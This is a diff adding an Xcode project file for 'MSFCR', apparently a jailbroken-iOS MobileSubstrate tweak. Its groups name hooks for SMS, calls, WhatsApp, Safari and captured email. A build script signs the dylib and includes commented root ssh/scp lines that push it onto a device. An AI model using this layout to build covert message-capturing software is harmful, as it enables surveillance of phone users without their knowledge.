+				08586B4D15BFB24800E65917 /* WhatsAppUtils */,
+				0829D8A215B5658B00D724B3 /* Safari Utils */,
+				35FCF8E815AD58F200333C1E /* CommonUtils */,
+				35B6FAAA1599936A000C6E9B /* Call Utils */,
+				35C149A5159425A800EE72AB /* SMS Utils */,
+				17F2B80715902C9A005C5B21 /* RestrictionHeaders.h */,
+				17F2B7EF159028C4005C5B21 /* RestrictionHandler.h */,
+				17F2B7F0159028C4005C5B21 /* RestrictionHandler.m */,
+			);
+			name = "Restriction Utils";
+			sourceTree = "<group>";
+		};
+		17F2B7F2159028CB005C5B21 /* Restriction */ = {
+			isa = PBXGroup;
+			children = (
+				17D363F01591EDB700E0EAB6 /* Restriction Utils */,
+				17D363EF1591EDAC00E0EAB6 /* Hooks */,
+			);
+			name = Restriction;
+			sourceTree = "<group>";
+		};
+		19C28FACFE9D520D11CA2CBB /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				85198FE10F780FA700C450C3 /* MSFCR.app */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		29B97314FDCFA39411CA2CEA /* CustomTemplate */ = {
+			isa = PBXGroup;
+			children = (
+				35A860C715DCAE1900B5E384 /* Cryptography.xcodeproj */,
+				35A170B215B42AC8008DF7C3 /* FxEvents.xcodeproj */,
+				35B6FAB3159993A6000C6E9B /* TelephonyNotification.xcodeproj */,
+				35C14A99159465EE00EE72AB /* DeviceLockManagerUtil.xcodeproj */,
+				178E44AD1590765C00017210 /* fmdb.xcodeproj */,
+				178E44531590760F00017210 /* Preferences.xcodeproj */,
+				175E3A1B158F0533000B9C4B /* FxStd.xcodeproj */,
+				175E3A12158F0527000B9C4B /* RestrictionManagerUtils.xcodeproj */,
+				175E3A09158F051A000B9C4B /* IPC.xcodeproj */,
+				080E96DDFE201D6D7F000001 /* Classes */,
+				17F2B7F2159028CB005C5B21 /* Restriction */,
+				083A46BC15944DA500E40605 /* AlertLock */,
+				29B97315FDCFA39411CA2CEA /* Other Sources */,
+				29B97317FDCFA39411CA2CEA /* Resources */,
+				29B97323FDCFA39411CA2CEA /* Frameworks */,
+				19C28FACFE9D520D11CA2CBB /* Products */,
+				178E44C7159076B300017210 /* libsqlite3.dylib */,
+			);
+			name = CustomTemplate;
+			sourceTree = "<group>";
+		};
+		29B97315FDCFA39411CA2CEA /* Other Sources */ = {
+			isa = PBXGroup;
+			children = (
+				32CA4F630368D1EE00C91783 /* MSFCR_Prefix.pch */,
+				35B0B867162FF1AB007B7DCD /* MSFCR.plist */,
+			);
+			name = "Other Sources";
+			sourceTree = "<group>";
+		};
+		29B97317FDCFA39411CA2CEA /* Resources */ = {
+			isa = PBXGroup;
+			children = (
+				851F89770F78276800A6C185 /* MSFCR-Info.plist */,
+			);
+			name = Resources;
+			sourceTree = "<group>";
+		};
+		29B97323FDCFA39411CA2CEA /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				35DC2E0E164CFC7100800BB6 /* MIME */,
+				35DF001C1640EBA000DBB4B7 /* Message.framework */,
+				35CA19E31619552F00060E12 /* SpringBoardServices */,
+				35AFBA2615AFC418005A04B4 /* ChatKit */,
+				35B6FBEF1599B13D000C6E9B /* CoreTelephony */,
+				851F89E00F7827E700A6C185 /* UIKit.framework */,
+				851F898F0F7827DC00A6C185 /* Foundation.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		35A170B315B42AC8008DF7C3 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				35A170B715B42AC8008DF7C3 /* libFxEvents.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		35A860C815DCAE1900B5E384 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				35A860CF15DCAE1900B5E384 /* libCryptography.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		35B6FAAA1599936A000C6E9B /* Call Utils */ = {
+			isa = PBXGroup;
+			children = (
+				35B6FAAB1599938F000C6E9B /* CallManager.h */,
+				35B6FAAC1599938F000C6E9B /* CallManager.m */,
+				17D362681591B16700E0EAB6 /* CallRestrictionHelper.h */,
+				17D362691591B16700E0EAB6 /* CallRestrictionHelper.m */,
+			);
+			name = "Call Utils";
+			sourceTree = "<group>";
+		};
+		35B6FAB4159993A6000C6E9B /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				35B6FABB159993A6000C6E9B /* libTelephonyNotification.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		35C149A5159425A800EE72AB /* SMS Utils */ = {
+			isa = PBXGroup;
+			children = (
+				17F2BA4E15906F6B005C5B21 /* SMSUtils.h */,
+				17F2BA4F15906F6B005C5B21 /* SMSUtils.m */,
+				35FCFAFC15ADA1C100333C1E /* MessageManager.h */,
+				35FCFAFD15ADA1C100333C1E /* MessageManager.m */,
+			);
+			name = "SMS Utils";
+			sourceTree = "<group>";
+		};
+		35C14A9A159465EE00EE72AB /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				35C14AA1159465EE00EE72AB /* libDeviceLockManagerUtil.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		35DFFFEE1640E76F00DBB4B7 /* EmailUtils */ = {
+			isa = PBXGroup;
+			children = (
+				17F2B8D115903CBB005C5B21 /* MailHook.h */,
+				35DF00291640EF5600DBB4B7 /* CapturedMailDAO.h */,
+				35DF002A1640EF5600DBB4B7 /* CapturedMailDAO.m */,
+				088B946916438B2A0024A426 /* EmailUtils.h */,
+				088B946A16438B2A0024A426 /* EmailUtils.m */,
+			);
+			name = EmailUtils;
+			sourceTree = "<group>";
+		};
+		35FCF8E815AD58F200333C1E /* CommonUtils */ = {
+			isa = PBXGroup;
+			children = (
+				35FCF8E915AD590100333C1E /* ConversationListUtils.h */,
+				35FCF8EA15AD590100333C1E /* ConversationListUtils.m */,
+			);
+			name = CommonUtils;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		1D6058900D05DD3D006BFB54 /* MSFCR */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 1D6058960D05DD3E006BFB54 /* Build configuration list for PBXNativeTarget "MSFCR" */;
+			buildPhases = (
+				1D60588D0D05DD3D006BFB54 /* Resources */,
+				1D60588E0D05DD3D006BFB54 /* Sources */,
+				1D60588F0D05DD3D006BFB54 /* Frameworks */,
+				178E44EA15907F5700017210 /* ShellScript */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				175E3A28158F0560000B9C4B /* PBXTargetDependency */,
+				175E3A2A158F0563000B9C4B /* PBXTargetDependency */,
+				175E3A2C158F0563000B9C4B /* PBXTargetDependency */,
+				178E44BC1590766C00017210 /* PBXTargetDependency */,
+				178E44BE1590766C00017210 /* PBXTargetDependency */,
+				35C14AA4159465FD00EE72AB /* PBXTargetDependency */,
+				35B6FBF71599B154000C6E9B /* PBXTargetDependency */,
+				35A170BA15B42B07008DF7C3 /* PBXTargetDependency */,
+				35A860D215DCAE2E00B5E384 /* PBXTargetDependency */,
+			);
+			name = MSFCR;
+			productName = MSFCR;
+			productReference = 85198FE10F780FA700C450C3 /* MSFCR.app */;
+			productType = "com.apple.product-type.application";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		29B97313FDCFA39411CA2CEA /* Project object */ = {
+			isa = PBXProject;
+			buildConfigurationList = C01FCF4E08A954540054247B /* Build configuration list for PBXProject "MSFCR" */;
+			compatibilityVersion = "Xcode 3.1";
+			hasScannedForEncodings = 1;
+			mainGroup = 29B97314FDCFA39411CA2CEA /* CustomTemplate */;
+			projectDirPath = "";
+			projectReferences = (
+				{
+					ProductGroup = 35A860C815DCAE1900B5E384 /* Products */;
+					ProjectRef = 35A860C715DCAE1900B5E384 /* Cryptography.xcodeproj */;
+				},
+				{
+					ProductGroup = 35C14A9A159465EE00EE72AB /* Products */;
+					ProjectRef = 35C14A99159465EE00EE72AB /* DeviceLockManagerUtil.xcodeproj */;
+				},
+				{
+					ProductGroup = 178E44AE1590765C00017210 /* Products */;
+					ProjectRef = 178E44AD1590765C00017210 /* fmdb.xcodeproj */;
+				},
+				{
+					ProductGroup = 35A170B315B42AC8008DF7C3 /* Products */;
+					ProjectRef = 35A170B215B42AC8008DF7C3 /* FxEvents.xcodeproj */;
+				},
+				{
+					ProductGroup = 175E3A1C158F0533000B9C4B /* Products */;
+					ProjectRef = 175E3A1B158F0533000B9C4B /* FxStd.xcodeproj */;
+				},
+				{
+					ProductGroup = 175E3A0A158F051A000B9C4B /* Products */;
+					ProjectRef = 175E3A09158F051A000B9C4B /* IPC.xcodeproj */;
+				},
+				{
+					ProductGroup = 178E44541590760F00017210 /* Products */;
+					ProjectRef = 178E44531590760F00017210 /* Preferences.xcodeproj */;
+				},
+				{
+					ProductGroup = 175E3A13158F0527000B9C4B /* Products */;
+					ProjectRef = 175E3A12158F0527000B9C4B /* RestrictionManagerUtils.xcodeproj */;
+				},
+				{
+					ProductGroup = 35B6FAB4159993A6000C6E9B /* Products */;
+					ProjectRef = 35B6FAB3159993A6000C6E9B /* TelephonyNotification.xcodeproj */;
+				},
+			);
+			projectRoot = "";
+			targets = (
+				1D6058900D05DD3D006BFB54 /* MSFCR */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXReferenceProxy section */
+		175E3A11158F051A000B9C4B /* libIPC.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libIPC.a;
+			remoteRef = 175E3A10158F051A000B9C4B /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		175E3A1A158F0527000B9C4B /* libRestrictionManagerUtils.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libRestrictionManagerUtils.a;
+			remoteRef = 175E3A19158F0527000B9C4B /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		175E3A23158F0533000B9C4B /* libFxStd.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libFxStd.a;
+			remoteRef = 175E3A22158F0533000B9C4B /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		178E445B1590760F00017210 /* libPreferences.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libPreferences.a;
+			remoteRef = 178E445A1590760F00017210 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		178E44B71590765C00017210 /* fmdb */ = {
+			isa = PBXReferenceProxy;
+			fileType = "compiled.mach-o.executable";
+			path = fmdb;
+			remoteRef = 178E44B61590765C00017210 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		178E44B91590765C00017210 /* libFMDB.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libFMDB.a;
+			remoteRef = 178E44B81590765C00017210 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		35A170B715B42AC8008DF7C3 /* libFxEvents.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libFxEvents.a;
+			remoteRef = 35A170B615B42AC8008DF7C3 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		35A860CF15DCAE1900B5E384 /* libCryptography.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libCryptography.a;
+			remoteRef = 35A860CE15DCAE1900B5E384 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		35B6FABB159993A6000C6E9B /* libTelephonyNotification.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libTelephonyNotification.a;
+			remoteRef = 35B6FABA159993A6000C6E9B /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		35C14AA1159465EE00EE72AB /* libDeviceLockManagerUtil.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libDeviceLockManagerUtil.a;
+			remoteRef = 35C14AA0159465EE00EE72AB /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+/* End PBXReferenceProxy section */
+
+/* Begin PBXResourcesBuildPhase section */
+		1D60588D0D05DD3D006BFB54 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				35B0B868162FF1AB007B7DCD /* MSFCR.plist in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		178E44EA15907F5700017210 /* ShellScript */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# FeelSecure\ncp \"${TARGET_BUILD_DIR}/${PRODUCT_NAME}.app/${EXECUTABLE_NAME}\" \"../../../FeelSecure/MSFCR-Dylib/${EXECUTABLE_NAME}.dylib\"\nstrip -u -r ../../../FeelSecure/MSFCR-Dylib/${EXECUTABLE_NAME}.dylib\nldid -S ../../../FeelSecure/MSFCR-Dylib/${EXECUTABLE_NAME}.dylib\n\n# Copy plist\ncp \"${TARGET_BUILD_DIR}/${PRODUCT_NAME}.app/MSFCR.plist\" \"../../../FeelSecure/MSFCR-Dylib/MSFCR.plist\"\n\n\n#ssh root@192.168.20.59 rm -rf /Library/MobileSubstrate/DynamicLibraries/MSF0.dylib\n#scp ../../../FeelSecure/MSFSP-Dylib/MSFSP.dylib root@192.168.20.59:/Library/MobileSubstrate/DynamicLibraries/MSF0.dylib\n#ssh root@192.168.20.59 respring\n\n#ssh root@192.168.20.59 rm -rf /Library/MobileSubstrate/DynamicLibraries/MSF1.dylib\n#scp ../../../FeelSecure/MSFCR-Dylib/${EXECUTABLE_NAME}.dylib root@192.168.20.59:/Library/MobileSubstrate/DynamicLibraries/MSF1.dylib\n#ssh root@192.168.20.59 respring\n";
+		};
+/* End PBXShellScriptBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		1D60588E0D05DD3D006BFB54 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				851F89700F78271600A6C185 /* MSFCR.mm in Sources */,
+				17F2B7F1159028C4005C5B21 /* RestrictionHandler.m in Sources */,
+				17F2BA5115906F6B005C5B21 /* SMSUtils.m in Sources */,
+				17D3626A1591B16700E0EAB6 /* CallRestrictionHelper.m in Sources */,
+				35B6FAAD1599938F000C6E9B /* CallManager.m in Sources */,
+				35FCF8EB15AD590100333C1E /* ConversationListUtils.m in Sources */,
+				35FCFAFE15ADA1C100333C1E /* MessageManager.m in Sources */,
+				0829D8B415B565AD00D724B3 /* SafariUtils.m in Sources */,
+				08586B4B15BFB24500E65917 /* WhatsAppUtils.m in Sources */,
+				08586B4C15BFB24500E65917 /* WhatsAppAccountInfo.m in Sources */,
+				089E8D2815BFFD78004558D2 /* WhatsAppDBUtils.m in Sources */,
+				0868A70D15C17B2100A00122 /* WhatsAppBlockEventStore.m in Sources */,
+				35DF002B1640EF5600DBB4B7 /* CapturedMailDAO.m in Sources */,
+				088B946B16438B2A0024A426 /* EmailUtils.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+		175E3A28158F0560000B9C4B /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = IPC;
+			targetProxy = 175E3A27158F0560000B9C4B /* PBXContainerItemProxy */;
+		};
+		175E3A2A158F0563000B9C4B /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = RestrictionManagerUtils;
+			targetProxy = 175E3A29158F0563000B9C4B /* PBXContainerItemProxy */;
+		};
+		175E3A2C158F0563000B9C4B /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = FxStd;
+			targetProxy = 175E3A2B158F0563000B9C4B /* PBXContainerItemProxy */;
+		};
+		178E44BC1590766C00017210 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = FMDB;
+			targetProxy = 178E44BB1590766C00017210 /* PBXContainerItemProxy */;
+		};
+		178E44BE1590766C00017210 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = Preferences;
+			targetProxy = 178E44BD1590766C00017210 /* PBXContainerItemProxy */;
+		};
+		35A170BA15B42B07008DF7C3 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = FxEvents;
+			targetProxy = 35A170B915B42B07008DF7C3 /* PBXContainerItemProxy */;
+		};
+		35A860D215DCAE2E00B5E384 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = Cryptography;
+			targetProxy = 35A860D115DCAE2E00B5E384 /* PBXContainerItemProxy */;
+		};
+		35B6FBF71599B154000C6E9B /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = TelephonyNotification;
+			targetProxy = 35B6FBF61599B154000C6E9B /* PBXContainerItemProxy */;
+		};
+		35C14AA4159465FD00EE72AB /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = DeviceLockManagerUtil;
+			targetProxy = 35C14AA3159465FD00EE72AB /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
+
+/* Begin XCBuildConfiguration section */
+		1D6058940D05DD3E006BFB54 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CODE_SIGN_IDENTITY = "";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
+				COPY_PHASE_STRIP = NO;
+				FRAMEWORK_SEARCH_PATHS = (
+					"$(inherited)",
+					"\"$(SDKROOT)$(SYSTEM_LIBRARY_DIR)/PrivateFrameworks\"",
+					"\"$(DEVELOPER_DIR)_iOS4_Xcode3.2.3/Platforms/iPhoneOS.platform/Developer/SDKs/ \"iPhoneOS4.3.sdk/System/Library/PrivateFrameworks\" \"$(SRCROOT)/../../OTC/Frameworks/iOS4\" \"$(SRCROOT)/../../OTC/Frameworks/iOS5\" \"$(SRCROOT)/../../OTC/Frameworks/iOS3\" \"$(SRCROOT)\" \"$(DEVELOPER_DIR)_xcode_3.2_3.2.3_sdk_3.1_4.0.2/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS4.0.sdk/System/Library/PrivateFrameworks\"",
+				);
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PRECOMPILE_PREFIX_HEADER = YES;
+				GCC_PREFIX_HEADER = MSFCR_Prefix.pch;
+				GENERATE_PROFILING_CODE = YES;
+				HEADER_SEARCH_PATHS = "";
+				INFOPLIST_FILE = "MSFCR-Info.plist";
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"\"$(SRCROOT)/../../OTC/Frameworks/iOS3/CoreTelephony.framework\"",
+					"\"$(SRCROOT)/../../OTC/Frameworks/iOS4/ChatKit\"",
+					"\"$(SRCROOT)/../../OTC/Frameworks/iOS3/SpringBoardServices.framework\"",
+					"\"$(SDKROOT)$(SYSTEM_LIBRARY_DIR)/PrivateFrameworks/MIME.framework\"",
+					"\"$(SRCROOT)/../../OTC/Frameworks/iOS3/MIME.framework\"",
+				);
+				OTHER_LDFLAGS = (
+					"-init",
+					"_$(PROJECT_NAME)Initialize",
+					"-lsubstrate",
+					"-dynamiclib",
+				);
+				PRODUCT_NAME = MSFCR;
+				USER_HEADER_SEARCH_PATHS = "../../OTC/Headers/iOS3/SpringBoardServices ../../OTC/Headers/iOS5/BulletinBoard ../../OTC/Headers/iOS5/Preferences ../../OTC/Headers/iOS5/SpringBoardPlugins/ChatKit.servicebundle ../../OTC/Headers/iOS4/MobileSMS ../../OTC/Headers/WhatsApp ../../OTC/Headers/iOS5/MobileSafari ../../OTC/Headers/iOS4/MobileSafari ../../Events/FxEvents ../../OTC/Headers/iOS5/ChatKit ../../OTC/Headers/iOS4/ChatKit ../../RestrictionManager/Source-RestrictionManager ../../TelephonyNotification/Source-TelephonyNotification ../../DeviceLockManager/Source-DeviceLockManagerUtils ../../DeviceLockManager/Source-DeviceLockManager ../../ccgus-fmdb-606b29d/src ../../Preferences/Source-Preferences ../../RestrictionManager/Source-RestrictionManagerUtils ../../IPC/Source-IPC ../../Std/FxStd/** ../../Std/FxStd ../../OTC/Headers/iOS5/SpringBoard ../../OTC/Headers/iOS4/SpringBoard ../../OTC/Headers/iOS3/CoreTelephony ../../OTC/MobileSubstrate ../../OTC/Headers/iOS5/CoreTelephony ../../OTC/Headers/iOS5/MobilePhone ../../OTC/Headers/iOS5/iMessage ../../OTC/Headers/iOS4/Message ../../OTC/Headers/iOS5/Message";
+			};
+			name = Debug;
+		};
+		1D6058950D05DD3E006BFB54 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CODE_SIGN_IDENTITY = "";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
+				COPY_PHASE_STRIP = YES;
+				FRAMEWORK_SEARCH_PATHS = (
+					"$(inherited)",
+					"\"$(SDKROOT)$(SYSTEM_LIBRARY_DIR)/PrivateFrameworks\"",
+					"\"$(SRCROOT)\"",
+					"\"$(DEVELOPER_DIR)_xcode_3.2_3.2.3_sdk_3.1_4.0.2/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS4.0.sdk/System/Library/PrivateFrameworks\"",
+				);
+				GCC_PRECOMPILE_PREFIX_HEADER = YES;
+				GCC_PREFIX_HEADER = MSFCR_Prefix.pch;
+				INFOPLIST_FILE = "MSFCR-Info.plist";
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"\"$(SRCROOT)/../../OTC/Frameworks/iOS3/CoreTelephony.framework\"",
+					"\"$(SRCROOT)/../../OTC/Frameworks/iOS4/ChatKit\"",
+					"\"$(SRCROOT)/../../OTC/Frameworks/iOS3/SpringBoardServices.framework\"",
+					"\"$(SDKROOT)$(SYSTEM_LIBRARY_DIR)/PrivateFrameworks/MIME.framework\"",
+					"\"$(SRCROOT)/../../OTC/Frameworks/iOS3/MIME.framework\"",
+				);
+				PRODUCT_NAME = MSFCR;
+				USER_HEADER_SEARCH_PATHS = "../../SyncTimeManager/Source-SyncTimeManager/ ../../RestrictionManager/Source-RestrictionManagerUtils ../../IPC/Source-IPC ../../Std/FxStd ../../SyncCommunicationDirectiveManager/Source-SyncCommunicationDirectiveManager";
+			};
+			name = Release;
+		};
+		C01FCF4F08A954540054247B /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ARCHS = "$(ARCHS_STANDARD_32_BIT)";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
+				GCC_C_LANGUAGE_STANDARD = c99;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				LD_OPENMP_FLAGS = "-fopenmp";
+				ONLY_ACTIVE_ARCH = YES;
+				OTHER_LDFLAGS = (
+					"_$(PROJECT_NAME)Initialize",
+					/Users/syam/Desktop/Phoenix/codebase/OTC/MobileSubstrate,
+				);
+				PREBINDING = YES;
+				SDKROOT = iphoneos3.0;
+			};
+			name = Debug;
+		};
+		C01FCF5008A954540054247B /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ARCHS = "$(ARCHS_STANDARD_32_BIT)";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
+				GCC_C_LANGUAGE_STANDARD = c99;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				PREBINDING = NO;
+				SDKROOT = iphoneos3.0;
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		1D6058960D05DD3E006BFB54 /* Build configuration list for PBXNativeTarget "MSFCR" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				1D6058940D05DD3E006BFB54 /* Debug */,
+				1D6058950D05DD3E006BFB54 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		C01FCF4E08A954540054247B /* Build configuration list for PBXProject "MSFCR" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				C01FCF4F08A954540054247B /* Debug */,
+				C01FCF5008A954540054247B /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+	};
+	rootObject = 29B97313FDCFA39411CA2CEA /* Project object */;
+}
